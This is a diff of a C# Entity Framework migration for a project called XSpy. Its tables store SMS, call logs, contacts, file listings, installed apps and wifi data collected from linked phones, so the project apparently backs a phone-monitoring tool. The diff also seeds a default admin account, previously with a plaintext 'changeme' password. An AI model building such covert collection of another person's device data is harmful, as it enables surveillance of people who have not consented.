@@ -36,13 +36,13 @@ namespace XSpy.Database.Migrations
                 columns: table => new
                 {
                     id = table.Column<Guid>(type: "char(36)", nullable: false),
-                    username = table.Column<string>(type: "longtext CHARACTER SET utf8mb4", nullable: true),
+                    username = table.Column<string>(type: "varchar(40) CHARACTER SET utf8mb4", maxLength: 40, nullable: true),
                     password = table.Column<string>(type: "varchar(100) CHARACTER SET utf8mb4", maxLength: 100, nullable: true),
                     fullname = table.Column<string>(type: "varchar(140) CHARACTER SET utf8mb4", maxLength: 140, nullable: true),
                     rank_id = table.Column<Guid>(type: "char(36)", nullable: false),
                     is_active = table.Column<bool>(type: "tinyint(1)", nullable: false),
                     device_token = table.Column<Guid>(type: "char(36)", nullable: false),
-                    email = table.Column<string>(type: "longtext CHARACTER SET utf8mb4", nullable: true)
+                    email = table.Column<string>(type: "varchar(120) CHARACTER SET utf8mb4", maxLength: 120, nullable: true)
                 },
                 constraints: table =>
                 {
@@ -92,6 +92,7 @@ namespace XSpy.Database.Migrations
                     manufacturer = table.Column<string>(type: "varchar(40) CHARACTER SET utf8mb4", maxLength: 40, nullable: true),
                     sys_version = table.Column<string>(type: "varchar(30) CHARACTER SET utf8mb4", maxLength: 30, nullable: true),
                     last_ip = table.Column<string>(type: "varchar(45) CHARACTER SET utf8mb4", maxLength: 45, nullable: true),
+                    is_online = table.Column<bool>(type: "tinyint(1)", nullable: false),
                     added_at = table.Column<DateTime>(type: "datetime(6)", nullable: false),
                     updated_at = table.Column<DateTime>(type: "datetime(6)", nullable: false)
                 },
@@ -115,6 +116,7 @@ namespace XSpy.Database.Migrations
                     name = table.Column<string>(type: "varchar(255) CHARACTER SET utf8mb4", maxLength: 255, nullable: true),
                     duration = table.Column<string>(type: "varchar(10) CHARACTER SET utf8mb4", maxLength: 10, nullable: true),
                     device_date = table.Column<string>(type: "varchar(30) CHARACTER SET utf8mb4", maxLength: 30, nullable: true),
+                    hash = table.Column<string>(type: "varchar(32) CHARACTER SET utf8mb4", maxLength: 32, nullable: true),
                     call_type = table.Column<int>(type: "int", nullable: false),
                     device_id = table.Column<Guid>(type: "char(36)", nullable: false),
                     created_at = table.Column<DateTime>(type: "datetime(6)", nullable: false)
@@ -155,8 +157,10 @@ namespace XSpy.Database.Migrations
                 columns: table => new
                 {
                     id = table.Column<Guid>(type: "char(36)", nullable: false),
-                    number = table.Column<string>(type: "longtext CHARACTER SET utf8mb4", nullable: true),
-                    contact_name = table.Column<string>(type: "longtext CHARACTER SET utf8mb4", nullable: true),
+                    number = table.Column<string>(type: "varchar(50) CHARACTER SET utf8mb4", maxLength: 50, nullable: true),
+                    contact_name = table.Column<string>(type: "varchar(120) CHARACTER SET utf8mb4", maxLength: 120, nullable: true),
+                    phone_id = table.Column<string>(type: "varchar(40) CHARACTER SET utf8mb4", maxLength: 40, nullable: true),
+                    hash = table.Column<string>(type: "varchar(32) CHARACTER SET utf8mb4", maxLength: 32, nullable: true),
                     device_id = table.Column<Guid>(type: "char(36)", nullable: false),
                     created_at = table.Column<DateTime>(type: "datetime(6)", nullable: false)
                 },
@@ -172,11 +176,34 @@ namespace XSpy.Database.Migrations
                 });
 
             migrationBuilder.CreateTable(
+                name: "device_file_list",
+                columns: table => new
+                {
+                    id = table.Column<Guid>(type: "char(36)", nullable: false),
+                    original_name = table.Column<string>(type: "longtext CHARACTER SET utf8mb4", nullable: true),
+                    original_path = table.Column<string>(type: "longtext CHARACTER SET utf8mb4", nullable: true),
+                    device_id = table.Column<Guid>(type: "char(36)", nullable: false),
+                    created_at = table.Column<DateTime>(type: "datetime(6)", nullable: false)
+                },
+                constraints: table =>
+                {
+                    table.PrimaryKey("PK_device_file_list", x => x.id);
+                    table.ForeignKey(
+                        name: "FK_device_file_list_devices_device_id",
+                        column: x => x.device_id,
+                        principalTable: "devices",
+                        principalColumn: "id",
+                        onDelete: ReferentialAction.Cascade);
+                });
+
+            migrationBuilder.CreateTable(
                 name: "device_files",
                 columns: table => new
                 {
                     id = table.Column<Guid>(type: "char(36)", nullable: false),
                     original_name = table.Column<string>(type: "longtext CHARACTER SET utf8mb4", nullable: true),
+                    original_path = table.Column<string>(type: "longtext CHARACTER SET utf8mb4", nullable: true),
+                    file_type = table.Column<string>(type: "varchar(20) CHARACTER SET utf8mb4", maxLength: 20, nullable: true),
                     file_path = table.Column<string>(type: "longtext CHARACTER SET utf8mb4", nullable: true),
                     device_id = table.Column<Guid>(type: "char(36)", nullable: false),
                     created_at = table.Column<DateTime>(type: "datetime(6)", nullable: false)
@@ -200,7 +227,7 @@ namespace XSpy.Database.Migrations
                     app_name = table.Column<string>(type: "varchar(120) CHARACTER SET utf8mb4", maxLength: 120, nullable: true),
                     package_name = table.Column<string>(type: "longtext CHARACTER SET utf8mb4", nullable: true),
                     version_name = table.Column<string>(type: "varchar(100) CHARACTER SET utf8mb4", maxLength: 100, nullable: true),
-                    version_code = table.Column<string>(type: "varchar(100) CHARACTER SET utf8mb4", maxLength: 100, nullable: true),
+                    version_code = table.Column<int>(type: "int", nullable: false),
                     device_id = table.Column<Guid>(type: "char(36)", nullable: false),
                     created_at = table.Column<DateTime>(type: "datetime(6)", nullable: false)
                 },
@@ -269,6 +296,7 @@ namespace XSpy.Database.Migrations
                 {
                     id = table.Column<Guid>(type: "char(36)", nullable: false),
                     key = table.Column<string>(type: "varchar(120) CHARACTER SET utf8mb4", maxLength: 120, nullable: true),
+                    isAllowed = table.Column<bool>(type: "tinyint(1)", nullable: false),
                     device_id = table.Column<Guid>(type: "char(36)", nullable: false),
                     created_at = table.Column<DateTime>(type: "datetime(6)", nullable: false)
                 },
@@ -300,27 +328,6 @@ namespace XSpy.Database.Migrations
                     table.PrimaryKey("PK_device_sms", x => x.id);
                     table.ForeignKey(
                         name: "FK_device_sms_devices_device_id",
-                        column: x => x.device_id,
-                        principalTable: "devices",
-                        principalColumn: "id",
-                        onDelete: ReferentialAction.Cascade);
-                });
-
-            migrationBuilder.CreateTable(
-                name: "device_voice_records",
-                columns: table => new
-                {
-                    id = table.Column<Guid>(type: "char(36)", nullable: false),
-                    original_name = table.Column<string>(type: "longtext CHARACTER SET utf8mb4", nullable: true),
-                    file_path = table.Column<string>(type: "longtext CHARACTER SET utf8mb4", nullable: true),
-                    device_id = table.Column<Guid>(type: "char(36)", nullable: false),
-                    created_at = table.Column<DateTime>(type: "datetime(6)", nullable: false)
-                },
-                constraints: table =>
-                {
-                    table.PrimaryKey("PK_device_voice_records", x => x.id);
-                    table.ForeignKey(
-                        name: "FK_device_voice_records_devices_device_id",
                         column: x => x.device_id,
                         principalTable: "devices",
                         principalColumn: "id",
@@ -377,17 +384,22 @@ namespace XSpy.Database.Migrations
             migrationBuilder.InsertData(
                 table: "rank_roles",
                 columns: new[] { "Id", "fake_role", "rank_id", "role_name" },
-                values: new object[] { new Guid("817285cb-e22e-4bfe-b5e0-bc8d603ea57f"), false, new Guid("62a840f9-c6ef-4d56-8652-4d9b46115b95"), "IS_ADMIN" });
+                values: new object[] { new Guid("e65961a5-7a6c-4caa-9803-d84835b62e72"), false, new Guid("62a840f9-c6ef-4d56-8652-4d9b46115b95"), "IS_ADMIN" });
 
             migrationBuilder.InsertData(
                 table: "rank_roles",
                 columns: new[] { "Id", "fake_role", "rank_id", "role_name" },
-                values: new object[] { new Guid("c18d9d6e-8be7-4dee-9d26-f442cb1dc0fc"), false, new Guid("4288aa01-036a-47e4-9db8-61e425ac2d43"), "IS_NORMAL_USER" });
+                values: new object[] { new Guid("39a6d0b7-cb2a-49ec-88bd-218477ff7884"), false, new Guid("4288aa01-036a-47e4-9db8-61e425ac2d43"), "IS_NORMAL_USER" });
 
             migrationBuilder.InsertData(
                 table: "users",
                 columns: new[] { "id", "device_token", "email", "is_active", "fullname", "password", "rank_id", "username" },
-                values: new object[] { new Guid("d8377373-0670-406d-9072-faa5011b3980"), new Guid("39d7d847-49ef-4434-b8aa-d1cd88d2430d"), "admin@admin.com", true, null, "changeme", new Guid("4288aa01-036a-47e4-9db8-61e425ac2d43"), "admin" });
+                values: new object[] { new Guid("f16f74da-99d3-4eed-9db1-e6b3c01204b8"), new Guid("ba53922b-64ee-424c-bdc5-19c9ee82c1af"), "admin@admin.com", true, null, "$2a$11$SsDzjmfewhAt.q/aLjmfTeqGFEtlNNO08mmw023eQYV6WBJMktDzS", new Guid("4288aa01-036a-47e4-9db8-61e425ac2d43"), "admin" });
+
+            migrationBuilder.InsertData(
+                table: "devices",
+                columns: new[] { "id", "added_at", "device_id", "is_online", "last_ip", "manufacturer", "model", "sys_version", "updated_at", "user_id" },
+                values: new object[] { new Guid("db48edb5-3fe8-4023-8647-f6094f7b2f51"), new DateTime(2021, 4, 6, 1, 32, 32, 137, DateTimeKind.Local).AddTicks(2671), "000000", false, "0.0.0.0", "Test device", "Test-Device", "10", new DateTime(2021, 4, 6, 1, 32, 32, 138, DateTimeKind.Local).AddTicks(5476), new Guid("f16f74da-99d3-4eed-9db1-e6b3c01204b8") });
 
             migrationBuilder.CreateIndex(
                 name: "IX_device_calls_device_id",
@@ -402,6 +414,11 @@ namespace XSpy.Database.Migrations
             migrationBuilder.CreateIndex(
                 name: "IX_device_contacts_device_id",
                 table: "device_contacts",
+                column: "device_id");
+
+            migrationBuilder.CreateIndex(
+                name: "IX_device_file_list_device_id",
+                table: "device_file_list",
                 column: "device_id");
 
             migrationBuilder.CreateIndex(
@@ -432,11 +449,6 @@ namespace XSpy.Database.Migrations
             migrationBuilder.CreateIndex(
                 name: "IX_device_sms_device_id",
                 table: "device_sms",
-                column: "device_id");
-
-            migrationBuilder.CreateIndex(
-                name: "IX_device_voice_records_device_id",
-                table: "device_voice_records",
                 column: "device_id");
 
             migrationBuilder.CreateIndex(
@@ -477,6 +489,9 @@ namespace XSpy.Database.Migrations
                 name: "device_contacts");
 
             migrationBuilder.DropTable(
+                name: "device_file_list");
+
+            migrationBuilder.DropTable(
                 name: "device_files");
 
             migrationBuilder.DropTable(
@@ -493,9 +508,6 @@ namespace XSpy.Database.Migrations
 
             migrationBuilder.DropTable(
                 name: "device_sms");
-
-            migrationBuilder.DropTable(
-                name: "device_voice_records");
 
             migrationBuilder.DropTable(
                 name: "device_wifi");
